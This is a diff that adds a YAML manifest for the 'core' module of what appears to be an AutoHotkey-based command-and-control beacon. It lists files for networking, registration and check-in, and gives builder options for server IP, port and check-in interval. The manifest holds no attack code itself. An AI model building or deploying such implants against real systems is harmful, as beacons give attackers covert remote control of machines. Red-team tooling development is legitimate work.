@@ -1,0 +1,49 @@
+module:
+  id: core
+  version: "1.0.0"
+  display_name: "Core"
+  description: "Core beacon functionality - networking, registration, and check-in"
+
+  # Core is always included - no dependencies
+  requires: []
+
+  # What this module provides
+  provides:
+    - NetworkClient
+    - Register
+    - CheckIn
+    - SendMsg
+    - BOFLog
+
+  # Code files in inclusion order
+  files:
+    - header.ahk
+    - logging.ahk
+    - network_base.ahk
+    - registration.ahk
+    - checkin.ahk
+    - main.ahk
+
+  # Schema contribution (core doesn't add commands, just infrastructure)
+  schema:
+    category_id: core
+    category_name: "Core"
+    modules: {}
+
+  # Builder UI options
+  config_options:
+    server_ip:
+      type: string
+      default: "127.0.0.1"
+      label: "Server IP"
+      required: true
+    server_port:
+      type: integer
+      default: 5074
+      label: "Server Port"
+      required: true
+    checkin_interval:
+      type: integer
+      default: 15000
+      label: "Check-in Interval (ms)"
+      required: true
